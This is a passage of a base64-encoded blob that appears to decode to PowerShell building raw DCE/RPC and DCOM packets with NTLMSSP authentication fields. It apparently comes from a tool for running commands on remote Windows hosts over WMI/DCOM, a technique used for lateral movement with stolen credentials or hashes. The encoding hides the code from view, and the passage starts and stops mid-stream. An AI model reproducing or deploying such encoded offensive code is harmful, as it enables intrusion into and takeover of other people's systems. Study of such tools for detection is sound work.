sMHgwMCwweDAwLDB4MDApKQ0KDQogICAgaWYoJHBhY2tldF9udW1fY3R4X2l0ZW1zWzBdIC1lcSAyKQ0KICAgIHsNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9Db250ZXh0SUQyIixbQnl0ZVtdXSgweDAxLDB4MDApKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX051bVRyYW5zSXRlbXMyIixbQnl0ZVtdXSgweDAxKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9Vbmtub3duMyIsW0J5dGVbXV0oMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfSW50ZXJmYWNlMiIsW0J5dGVbXV0oMHhjNCwweGZlLDB4ZmMsMHg5OSwweDYwLDB4NTIsMHgxYiwweDEwLDB4YmIsMHhjYiwweDAwLDB4YWEsMHgwMCwweDIxLDB4MzQsMHg3YSkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfSW50ZXJmYWNlVmVyMiIsW0J5dGVbXV0oMHgwMCwweDAwKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9JbnRlcmZhY2VWZXJNaW5vcjIiLFtCeXRlW11dKDB4MDAsMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfVHJhbnNmZXJTeW50YXgyIixbQnl0ZVtdXSgweDJjLDB4MWMsMHhiNywweDZjLDB4MTIsMHg5OCwweDQwLDB4NDUsMHgwMywweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9UcmFuc2ZlclN5bnRheFZlcjIiLFtCeXRlW11dKDB4MDEsMHgwMCwweDAwLDB4MDApKQ0KICAgIH0NCiAgICBlbHNlaWYoJHBhY2tldF9udW1fY3R4X2l0ZW1zWzBdIC1lcSAzKQ0KICAgIHsNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9Db250ZXh0SUQyIixbQnl0ZVtdXSgweDAxLDB4MDApKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX051bVRyYW5zSXRlbXMyIixbQnl0ZVtdXSgweDAxKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9Vbmtub3duMyIsW0J5dGVbXV0oMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfSW50ZXJmYWNlMiIsW0J5dGVbXV0oMHg0MywweDAxLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4YzAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0NikpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfSW50ZXJmYWNlVmVyMiIsW0J5dGVbXV0oMHgwMCwweDAwKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9JbnRlcmZhY2VWZXJNaW5vcjIiLFtCeXRlW11dKDB4MDAsMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfVHJhbnNmZXJTeW50YXgyIixbQnl0ZVtdXSgweDMzLDB4MDUsMHg3MSwweDcxLDB4YmEsMHhiZSwweDM3LDB4NDksMHg4MywweDE5LDB4YjUsMHhkYiwweGVmLDB4OWMsMHhjYywweDM2KSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9UcmFuc2ZlclN5bnRheFZlcjIiLFtCeXRlW11dKDB4MDEsMHgwMCwweDAwLDB4MDApKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0NvbnRleHRJRDMiLFtCeXRlW11dKDB4MDIsMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfTnVtVHJhbnNJdGVtczMiLFtCeXRlW11dKDB4MDEpKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX1Vua25vd240IixbQnl0ZVtdXSgweDAwKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9JbnRlcmZhY2UzIixbQnl0ZVtdXSgweDQzLDB4MDEsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHhjMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDQ2KSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9JbnRlcmZhY2VWZXIzIixbQnl0ZVtdXSgweDAwLDB4MDApKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0ludGVyZmFjZVZlck1pbm9yMyIsW0J5dGVbXV0oMHgwMCwweDAwKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9UcmFuc2ZlclN5bnRheDMiLFtCeXRlW11dKDB4MmMsMHgxYywweGI3LDB4NmMsMHgxMiwweDk4LDB4NDAsMHg0NSwweDAzLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX1RyYW5zZmVyU3ludGF4VmVyMyIsW0J5dGVbXV0oMHgwMSwweDAwLDB4MDAsMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQXV0aFR5cGUiLFtCeXRlW11dKDB4MGEpKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0F1dGhMZXZlbCIsW0J5dGVbXV0oMHgwNCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQXV0aFBhZExlbmd0aCIsW0J5dGVbXV0oMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQXV0aFJlc2VydmVkIixbQnl0ZVtdXSgweDAwKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9Db250ZXh0SUQ0IixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9JZGVudGlmaWVyIixbQnl0ZVtdXSgweDRlLDB4NTQsMHg0YywweDRkLDB4NTMsMHg1MywweDUwLDB4MDApKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX01lc3NhZ2VUeXBlIixbQnl0ZVtdXSgweDAxLDB4MDAsMHgwMCwweDAwKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9OZWdvdGlhdGVGbGFncyIsW0J5dGVbXV0oMHg5NywweDgyLDB4MDgsMHhlMikpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQ2FsbGluZ1dvcmtzdGF0aW9uRG9tYWluIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0NhbGxpbmdXb3Jrc3RhdGlvbk5hbWUiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfT1NWZXJzaW9uIixbQnl0ZVtdXSgweDA2LDB4MDEsMHhiMSwweDFkLDB4MDAsMHgwMCwweDAwLDB4MGYpKQ0KICAgIH0NCg0KICAgIGlmKCRwYWNrZXRfY2FsbF9JRCAtZXEgMykNCiAgICB7DQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQXV0aFR5cGUiLFtCeXRlW11dKDB4MGEpKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0F1dGhMZXZlbCIsW0J5dGVbXV0oMHgwMikpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQXV0aFBhZExlbmd0aCIsW0J5dGVbXV0oMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQXV0aFJlc2VydmVkIixbQnl0ZVtdXSgweDAwKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9Db250ZXh0SUQzIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9JZGVudGlmaWVyIixbQnl0ZVtdXSgweDRlLDB4NTQsMHg0YywweDRkLDB4NTMsMHg1MywweDUwLDB4MDApKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX01lc3NhZ2VUeXBlIixbQnl0ZVtdXSgweDAxLDB4MDAsMHgwMCwweDAwKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9OZWdvdGlhdGVGbGFncyIsW0J5dGVbXV0oMHg5NywweDgyLDB4MDgsMHhlMikpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfQ2FsbGluZ1dvcmtzdGF0aW9uRG9tYWluIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0NhbGxpbmdXb3Jrc3RhdGlvbk5hbWUiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfT1NWZXJzaW9uIixbQnl0ZVtdXSgweDA2LDB4MDEsMHhiMSwweDFkLDB4MDAsMHgwMCwweDAwLDB4MGYpKQ0KICAgIH0NCg0KICAgIHJldHVybiAkcGFja2V0X1JQQ0JpbmQNCn0NCg0KZnVuY3Rpb24gR2V0LVBhY2tldFJQQ0FVVEgzKCkNCnsNCiAgICBwYXJhbShbQnl0ZVtdXSRwYWNrZXRfTlRMTVNTUCkNCg0KICAgIFtCeXRlW11dJHBhY2tldF9OVExNU1NQX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHBhY2tldF9OVExNU1NQLkxlbmd0aCkNCiAgICAkcGFja2V0X05UTE1TU1BfbGVuZ3RoID0gJHBhY2tldF9OVExNU1NQX2xlbmd0aFswLDFdDQogICAgW0J5dGVbXV0kcGFja2V0X1JQQ19sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRwYWNrZXRfTlRMTVNTUC5MZW5ndGggKyAyOCkNCiAgICAkcGFja2V0X1JQQ19sZW5ndGggPSAkcGFja2V0X1JQQ19sZW5ndGhbMCwxXQ0KDQogICAgJHBhY2tldF9SUENBdXRoMyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5DQogICAgJHBhY2tldF9SUENBdXRoMy5BZGQoIlJQQ0FVVEgzX1ZlcnNpb24iLFtCeXRlW11dKDB4MDUpKQ0KICAgICRwYWNrZXRfUlBDQXV0aDMuQWRkKCJSUENBVVRIM19WZXJzaW9uTWlub3IiLFtCeXRlW11dKDB4MDApKQ0KICAgICRwYWNrZXRfUlBDQXV0aDMuQWRkKCJSUENBVVRIM19QYWNrZXRUeXBlIixbQnl0ZVtdXSgweDEwKSkNCiAgICAkcGFja2V0X1JQQ0F1dGgzLkFkZCgiUlBDQVVUSDNfUGFja2V0RmxhZ3MiLFtCeXRlW11dKDB4MDMpKQ0KICAgICRwYWNrZXRfUlBDQXV0aDMuQWRkKCJSUENBVVRIM19EYXRhUmVwcmVzZW50YXRpb24iLFtCeXRlW11dKDB4MTAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfUlBDQXV0aDMuQWRkKCJSUENBVVRIM19GcmFnTGVuZ3RoIiwkcGFja2V0X1JQQ19sZW5ndGgpDQogICAgJHBhY2tldF9SUENBdXRoMy5BZGQoIlJQQ0FVVEgzX0F1dGhMZW5ndGgiLCRwYWNrZXRfTlRMTVNTUF9sZW5ndGgpDQogICAgJHBhY2tldF9SUENBdXRoMy5BZGQoIlJQQ0FVVEgzX0NhbGxJRCIsW0J5dGVbXV0oMHgwMywweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9SUENBdXRoMy5BZGQoIlJQQ0FVVEgzX01heFhtaXRGcmFnIixbQnl0ZVtdXSgweGQwLDB4MTYpKQ0KICAgICRwYWNrZXRfUlBDQXV0aDMuQWRkKCJSUENBVVRIM19NYXhSZWN2RnJhZyIsW0J5dGVbXV0oMHhkMCwweDE2KSkNCiAgICAkcGFja2V0X1JQQ0F1dGgzLkFkZCgiUlBDQVVUSDNfQXV0aFR5cGUiLFtCeXRlW11dKDB4MGEpKQ0KICAgICRwYWNrZXRfUlBDQXV0aDMuQWRkKCJSUENBVVRIM19BdXRoTGV2ZWwiLFtCeXRlW11dKDB4MDIpKQ0KICAgICRwYWNrZXRfUlBDQXV0aDMuQWRkKCJSUENBVVRIM19BdXRoUGFkTGVuZ3RoIixbQnl0ZVtdXSgweDAwKSkNCiAgICAkcGFja2V0X1JQQ0F1dGgzLkFkZCgiUlBDQVVUSDNfQXV0aFJlc2VydmVkIixbQnl0ZVtdXSgweDAwKSkNCiAgICAkcGFja2V0X1JQQ0F1dGgzLkFkZCgiUlBDQVVUSDNfQ29udGV4dElEIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1JQQ0F1dGgzLkFkZCgiUlBDQVVUSDNfTlRMTVNTUCIsJHBhY2tldF9OVExNU1NQKQ0KDQogICAgcmV0dXJuICRwYWNrZXRfUlBDQXV0aDMNCn0NCg0KZnVuY3Rpb24gR2V0LVBhY2tldFJQQ1JlcXVlc3QoKQ0Kew0KICAgIHBhcmFtKFtCeXRlW11dJHBhY2tldF9mbGFncyxbSW50XSRwYWNrZXRfc2VydmljZV9sZW5ndGgsW0ludF0kcGFja2V0X2F1dGhfbGVuZ3RoLFtJbnRdJHBhY2tldF9hdXRoX3BhZGRpbmcsW0J5dGVbXV0kcGFja2V0X2NhbGxfSUQsW0J5dGVbXV0kcGFja2V0X2NvbnRleHRfSUQsW0J5dGVbXV0kcGFja2V0X29wbnVtLFtCeXRlW11dJHBhY2tldF9kYXRhKQ0KDQogICAgaWYoJHBhY2tldF9hdXRoX2xlbmd0aCAtZ3QgMCkNCiAgICB7DQogICAgICAgICRwYWNrZXRfZnVsbF9hdXRoX2xlbmd0aCA9ICRwYWNrZXRfYXV0aF9sZW5ndGggKyAkcGFja2V0X2F1dGhfcGFkZGluZyArIDgNCiAgICB9DQoNCiAgICBbQnl0ZVtdXSRwYWNrZXRfd3JpdGVfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X3NlcnZpY2VfbGVuZ3RoICsgMjQgKyAkcGFja2V0X2Z1bGxfYXV0aF9sZW5ndGggKyAkcGFja2V0X2RhdGEuTGVuZ3RoKQ0KICAgIFtCeXRlW11dJHBhY2tldF9mcmFnX2xlbmd0aCA9ICRwYWNrZXRfd3JpdGVfbGVuZ3RoWzAsMV0NCiAgICBbQnl0ZVtdXSRwYWNrZXRfYWxsb2NfaGludCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHBhY2tldF9zZXJ2aWNlX2xlbmd0aCArICRwYWNrZXRfZGF0YS5MZW5ndGgpDQogICAgW0J5dGVbXV0kcGFja2V0X2F1dGhfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X2F1dGhfbGVuZ3RoKQ0KICAgICRwYWNrZXRfYXV0aF9sZW5ndGggPSAkcGFja2V0X2F1dGhfbGVuZ3RoWzAsMV0NCg0KICAgICRwYWNrZXRfUlBDUmVxdWVzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5DQogICAgJHBhY2tldF9SUENSZXF1ZXN0LkFkZCgiUlBDUmVxdWVzdF9WZXJzaW9uIixbQnl0ZVtdXSgweDA1KSkNCiAgICAkcGFja2V0X1JQQ1JlcXVlc3QuQWRkKCJSUENSZXF1ZXN0X1ZlcnNpb25NaW5vciIsW0J5dGVbXV0oMHgwMCkpDQogICAgJHBhY2tldF9SUENSZXF1ZXN0LkFkZCgiUlBDUmVxdWVzdF9QYWNrZXRUeXBlIixbQnl0ZVtdXSgweDAwKSkNCiAgICAkcGFja2V0X1JQQ1JlcXVlc3QuQWRkKCJSUENSZXF1ZXN0X1BhY2tldEZsYWdzIiwkcGFja2V0X2ZsYWdzKQ0KICAgICRwYWNrZXRfUlBDUmVxdWVzdC5BZGQoIlJQQ1JlcXVlc3RfRGF0YVJlcHJlc2VudGF0aW9uIixbQnl0ZVtdXSgweDEwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1JQQ1JlcXVlc3QuQWRkKCJSUENSZXF1ZXN0X0ZyYWdMZW5ndGgiLCRwYWNrZXRfZnJhZ19sZW5ndGgpDQogICAgJHBhY2tldF9SUENSZXF1ZXN0LkFkZCgiUlBDUmVxdWVzdF9BdXRoTGVuZ3RoIiwkcGFja2V0X2F1dGhfbGVuZ3RoKQ0KICAgICRwYWNrZXRfUlBDUmVxdWVzdC5BZGQoIlJQQ1JlcXVlc3RfQ2FsbElEIiwkcGFja2V0X2NhbGxfSUQpDQogICAgJHBhY2tldF9SUENSZXF1ZXN0LkFkZCgiUlBDUmVxdWVzdF9BbGxvY0hpbnQiLCRwYWNrZXRfYWxsb2NfaGludCkNCiAgICAkcGFja2V0X1JQQ1JlcXVlc3QuQWRkKCJSUENSZXF1ZXN0X0NvbnRleHRJRCIsJHBhY2tldF9jb250ZXh0X0lEKQ0KICAgICRwYWNrZXRfUlBDUmVxdWVzdC5BZGQoIlJQQ1JlcXVlc3RfT3BudW0iLCRwYWNrZXRfb3BudW0pDQoNCiAgICBpZigkcGFja2V0X2RhdGEuTGVuZ3RoKQ0KICAgIHsNCiAgICAgICAgJHBhY2tldF9SUENSZXF1ZXN0LkFkZCgiUlBDUmVxdWVzdF9EYXRhIiwkcGFja2V0X2RhdGEpDQogICAgfQ0KDQogICAgcmV0dXJuICRwYWNrZXRfUlBDUmVxdWVzdA0KfQ0KDQpmdW5jdGlvbiBHZXQtUGFja2V0UlBDQWx0ZXJDb250ZXh0KCkNCnsNCiAgICBwYXJhbShbQnl0ZVtdXSRwYWNrZXRfYXNzb2NfZ3JvdXAsW0J5dGVbXV0kcGFja2V0X2NhbGxfSUQsW0J5dGVbXV0kcGFja2V0X2NvbnRleHRfSUQsW0J5dGVbXV0kcGFja2V0X2ludGVyZmFjZV9VVUlEKQ0KDQogICAgJHBhY2tldF9SUENBbHRlckNvbnRleHQgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQ0KICAgICRwYWNrZXRfUlBDQWx0ZXJDb250ZXh0LkFkZCgiUlBDQWx0ZXJDb250ZXh0X1ZlcnNpb24iLFtCeXRlW11dKDB4MDUpKQ0KICAgICRwYWNrZXRfUlBDQWx0ZXJDb250ZXh0LkFkZCgiUlBDQWx0ZXJDb250ZXh0X1ZlcnNpb25NaW5vciIsW0J5dGVbXV0oMHgwMCkpDQogICAgJHBhY2tldF9SUENBbHRlckNvbnRleHQuQWRkKCJSUENBbHRlckNvbnRleHRfUGFja2V0VHlwZSIsW0J5dGVbXV0oMHgwZSkpDQogICAgJHBhY2tldF9SUENBbHRlckNvbnRleHQuQWRkKCJSUENBbHRlckNvbnRleHRfUGFja2V0RmxhZ3MiLFtCeXRlW11dKDB4MDMpKQ0KICAgICRwYWNrZXRfUlBDQWx0ZXJDb250ZXh0LkFkZCgiUlBDQWx0ZXJDb250ZXh0X0RhdGFSZXByZXNlbnRhdGlvbiIsW0J5dGVbXV0oMHgxMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9SUENBbHRlckNvbnRleHQuQWRkKCJSUENBbHRlckNvbnRleHRfRnJhZ0xlbmd0aCIsW0J5dGVbXV0oMHg0OCwweDAwKSkNCiAgICAkcGFja2V0X1JQQ0FsdGVyQ29udGV4dC5BZGQoIlJQQ0FsdGVyQ29udGV4dF9BdXRoTGVuZ3RoIixbQnl0ZVtdXSgweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfUlBDQWx0ZXJDb250ZXh0LkFkZCgiUlBDQWx0ZXJDb250ZXh0X0NhbGxJRCIsJHBhY2tldF9jYWxsX0lEKQ0KICAgICRwYWNrZXRfUlBDQWx0ZXJDb250ZXh0LkFkZCgiUlBDQWx0ZXJDb250ZXh0X01heFhtaXRGcmFnIixbQnl0ZVtdXSgweGQwLDB4MTYpKQ0KICAgICRwYWNrZXRfUlBDQWx0ZXJDb250ZXh0LkFkZCgiUlBDQWx0ZXJDb250ZXh0X01heFJlY3ZGcmFnIixbQnl0ZVtdXSgweGQwLDB4MTYpKQ0KICAgICRwYWNrZXRfUlBDQWx0ZXJDb250ZXh0LkFkZCgiUlBDQWx0ZXJDb250ZXh0X0Fzc29jR3JvdXAiLCRwYWNrZXRfYXNzb2NfZ3JvdXApDQogICAgJHBhY2tldF9SUENBbHRlckNvbnRleHQuQWRkKCJSUENBbHRlckNvbnRleHRfTnVtQ3R4SXRlbXMiLFtCeXRlW11dKDB4MDEpKQ0KICAgICRwYWNrZXRfUlBDQWx0ZXJDb250ZXh0LkFkZCgiUlBDQWx0ZXJDb250ZXh0X1Vua25vd24iLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1JQQ0FsdGVyQ29udGV4dC5BZGQoIlJQQ0FsdGVyQ29udGV4dF9Db250ZXh0SUQiLCRwYWNrZXRfY29udGV4dF9JRCkNCiAgICAkcGFja2V0X1JQQ0FsdGVyQ29udGV4dC5BZGQoIlJQQ0FsdGVyQ29udGV4dF9OdW1UcmFuc0l0ZW1zIixbQnl0ZVtdXSgweDAxKSkNCiAgICAkcGFja2V0X1JQQ0FsdGVyQ29udGV4dC5BZGQoIlJQQ0FsdGVyQ29udGV4dF9Vbmtub3duMiIsW0J5dGVbXV0oMHgwMCkpDQogICAgJHBhY2tldF9SUENBbHRlckNvbnRleHQuQWRkKCJSUENBbHRlckNvbnRleHRfSW50ZXJmYWNlIiwkcGFja2V0X2ludGVyZmFjZV9VVUlEKQ0KICAgICRwYWNrZXRfUlBDQWx0ZXJDb250ZXh0LkFkZCgiUlBDQWx0ZXJDb250ZXh0X0ludGVyZmFjZVZlciIsW0J5dGVbXV0oMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1JQQ0FsdGVyQ29udGV4dC5BZGQoIlJQQ0FsdGVyQ29udGV4dF9JbnRlcmZhY2VWZXJNaW5vciIsW0J5dGVbXV0oMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1JQQ0FsdGVyQ29udGV4dC5BZGQoIlJQQ0FsdGVyQ29udGV4dF9UcmFuc2ZlclN5bnRheCIsW0J5dGVbXV0oMHgwNCwweDVkLDB4ODgsMHg4YSwweGViLDB4MWMsMHhjOSwweDExLDB4OWYsMHhlOCwweDA4LDB4MDAsMHgyYiwweDEwLDB4NDgsMHg2MCkpDQogICAgJHBhY2tldF9SUENBbHRlckNvbnRleHQuQWRkKCJSUENBbHRlckNvbnRleHRfVHJhbnNmZXJTeW50YXhWZXIiLFtCeXRlW11dKDB4MDIsMHgwMCwweDAwLDB4MDApKQ0KDQogICAgcmV0dXJuICRwYWNrZXRfUlBDQWx0ZXJDb250ZXh0DQp9DQoNCmZ1bmN0aW9uIEdldC1QYWNrZXROVExNU1NQVmVyaWZpZXIoKQ0Kew0KICAgIHBhcmFtKFtJbnRdJHBhY2tldF9hdXRoX3BhZGRpbmcsW0J5dGVbXV0kcGFja2V0X2F1dGhfbGV2ZWwsW0J5dGVbXV0kcGFja2V0X3NlcXVlbmNlX251bWJlcikNCg0KICAgICRwYWNrZXRfTlRMTVNTUFZlcmlmaWVyID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkNCg0KICAgIGlmKCRwYWNrZXRfYXV0aF9wYWRkaW5nIC1lcSA0KQ0KICAgIHsNCiAgICAgICAgJHBhY2tldF9OVExNU1NQVmVyaWZpZXIuQWRkKCJOVExNU1NQVmVyaWZpZXJfQXV0aFBhZGRpbmciLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICAgICBbQnl0ZVtdXSRwYWNrZXRfYXV0aF9wYWRfbGVuZ3RoID0gMHgwNA0KICAgIH0NCiAgICBlbHNlaWYoJHBhY2tldF9hdXRoX3BhZGRpbmcgLWVxIDgpDQogICAgew0KICAgICAgICAkcGFja2V0X05UTE1TU1BWZXJpZmllci5BZGQoIk5UTE1TU1BWZXJpZmllcl9BdXRoUGFkZGluZyIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAgICAgW0J5dGVbXV0kcGFja2V0X2F1dGhfcGFkX2xlbmd0aCA9IDB4MDgNCiAgICB9DQogICAgZWxzZWlmKCRwYWNrZXRfYXV0aF9wYWRkaW5nIC1lcSAxMikNCiAgICB7DQogICAgICAgICRwYWNrZXRfTlRMTVNTUFZlcmlmaWVyLkFkZCgiTlRMTVNTUFZlcmlmaWVyX0F1dGhQYWRkaW5nIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgICAgIFtCeXRlW11dJHBhY2tldF9hdXRoX3BhZF9sZW5ndGggPSAweDBjDQogICAgfQ0KICAgIGVsc2UNCiAgICB7DQogICAgICAgIFtCeXRlW11dJHBhY2tldF9hdXRoX3BhZF9sZW5ndGggPSAweDAwDQogICAgfQ0KDQogICAgJHBhY2tldF9OVExNU1NQVmVyaWZpZXIuQWRkKCJOVExNU1NQVmVyaWZpZXJfQXV0aFR5cGUiLFtCeXRlW11dKDB4MGEpKQ0KICAgICRwYWNrZXRfTlRMTVNTUFZlcmlmaWVyLkFkZCgiTlRMTVNTUFZlcmlmaWVyX0F1dGhMZXZlbCIsJHBhY2tldF9hdXRoX2xldmVsKQ0KICAgICRwYWNrZXRfTlRMTVNTUFZlcmlmaWVyLkFkZCgiTlRMTVNTUFZlcmlmaWVyX0F1dGhQYWRMZW4iLCRwYWNrZXRfYXV0aF9wYWRfbGVuZ3RoKQ0KICAgICRwYWNrZXRfTlRMTVNTUFZlcmlmaWVyLkFkZCgiTlRMTVNTUFZlcmlmaWVyX0F1dGhSZXNlcnZlZCIsW0J5dGVbXV0oMHgwMCkpDQogICAgJHBhY2tldF9OVExNU1NQVmVyaWZpZXIuQWRkKCJOVExNU1NQVmVyaWZpZXJfQXV0aENvbnRleHRJRCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9OVExNU1NQVmVyaWZpZXIuQWRkKCJOVExNU1NQVmVyaWZpZXJfTlRMTVNTUFZlcmlmaWVyVmVyc2lvbk51bWJlciIsW0J5dGVbXV0oMHgwMSwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9OVExNU1NQVmVyaWZpZXIuQWRkKCJOVExNU1NQVmVyaWZpZXJfTlRMTVNTUFZlcmlmaWVyQ2hlY2tzdW0iLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9OVExNU1NQVmVyaWZpZXIuQWRkKCJOVExNU1NQVmVyaWZpZXJfTlRMTVNTUFZlcmlmaWVyU2VxdWVuY2VOdW1iZXIiLCRwYWNrZXRfc2VxdWVuY2VfbnVtYmVyKQ0KDQogICAgcmV0dXJuICRwYWNrZXRfTlRMTVNTUFZlcmlmaWVyDQp9DQoNCmZ1bmN0aW9uIEdldC1QYWNrZXREQ09NUmVtUXVlcnlJbnRlcmZhY2UoKQ0Kew0KICAgIHBhcmFtKFtCeXRlW11dJHBhY2tldF9jYXVzYWxpdHlfSUQsW0J5dGVbXV0kcGFja2V0X0lQSUQsW0J5dGVbXV0kcGFja2V0X0lJRCkNCg0KICAgICRwYWNrZXRfRENPTVJlbVF1ZXJ5SW50ZXJmYWNlID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvb